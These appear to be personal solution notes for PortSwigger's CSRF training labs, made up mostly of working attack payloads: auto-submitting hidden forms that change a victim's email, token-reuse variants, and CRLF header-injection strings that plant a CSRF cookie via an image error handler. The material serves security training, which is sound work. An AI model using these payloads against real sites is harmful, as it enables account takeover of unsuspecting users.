# [1. Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

```javascript
<form action="https://0a99000404688a6081f44d2f002800b2.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker2@evil-user.net" /></form>
<script> document.forms[0].submit(); </script>
```

# [2. Lab: CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies **defenses to certain types of requests**.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

```js
<form action="https://0a99000404688a6081f44d2f002800b2.web-security-academy.net/my-account/change-email?email=2332%4022&csrf=zYz8BGtIsz8YghTsu3R1RqL2Nee09Rnc" method="GET">
<input type="hidden" name="email" value="attacker2@evil-user.net" /></form>
<script> document.forms[0].submit(); </script>
```

# [3. Lab: CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)

```javascript
<form action="https://0a78007e049ffd26822483c6005e0023.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker3@evil-user.net" />
<script> document.forms[0].submit(); </script>
```

# [4. Lab: CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)

add:

```js
<input type='hidden' name='csrf' value='clear-token-from-inspect' />
```

```javascript
<form action="https://0a7f007603c24cd98239e7c200e70039.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker6@evil-user.net" />
<input type="hidden" name="csrf" value="4lRNER6rNT4NeZdXhKIb31g2Zj1eve2T" />
</form>
<script> document.forms[0].submit(); </script>
```

# [5. Lab: CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)

payload 1

```javascript
<form action="https://0a7000c7040897b983820a4b00c50025.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker6@evil-user.net" />
<input type="hidden" name="csrf" value="9WD6SbTbz4JlW0XYUmERl1mt6vpaaqhq" />
</form>
<img>
<script> document.forms[0].submit(); </script>
```

payload 2:

```bash
/?search=%3Ctest%3E %0d%0a
Set-Cookie: csrf=9WD6SbTbz4JlW0XYUmERl1mt6vpaaqhq;
```

payload 3:

```bash
/?search=%3Ctest%3E%0d%0aSet-Cookie:+csrf=9WD6SbTbz4JlW0XYUmERl1mt6vpaaqhq;
```

full payload 4:

```javascript
<form action="https://0a7000c7040897b983820a4b00c50025.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker6@evil-user.net" />
<input type="hidden" name="csrf" value="9WD6SbTbz4JlW0XYUmERl1mt6vpaaqhq" />
</form>
<img src="https://0a7000c7040897b983820a4b00c50025.web-security-academy.net/?search=%3Ctest%3E%0d%0aSet-Cookie:+csrf=9WD6SbTbz4JlW0XYUmERl1mt6vpaaqhq;" onerror="document.forms[0].submit()">
```

<form action="https://0ad5002a041c201b81843f160055009f.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@gmail.com" />
<input type="hidden" name="csrf" value="WV1IaxbetxuFZ8Y1AoitsQJkWlu1H1GF" />
</form>
<img src="https://0ad5002a041c201b81843f160055009f.web-security-academy.net/?search=hhhhh%0d%0aSet-Cookie:+csrf=WV1IaxbetxuFZ8Y1AoitsQJkWlu1H1GF%26SameSite=None" onerror="document.forms[0].submit()">
